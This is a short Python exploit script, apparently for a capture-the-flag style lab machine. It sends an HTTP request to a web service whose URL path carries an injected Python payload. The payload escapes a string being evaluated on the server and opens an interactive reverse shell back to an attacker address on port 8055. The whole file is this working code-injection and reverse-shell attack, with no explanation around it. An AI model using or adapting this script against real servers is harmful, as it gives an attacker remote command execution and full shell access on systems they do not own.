#!/usr/bin/python

import os
import urllib.parse
import requests

url = 'http://10.10.10.168:8080/'

path = """' ; import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.39",8055));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'"""

# URL Encode Mode
path = urllib.parse.unquote(path)
#info = "output = 'Document: {}'"
#exec(info.format(path))

r = requests.get(url + path)

print(r.status_code)
print(r.headers)
print(r.text)
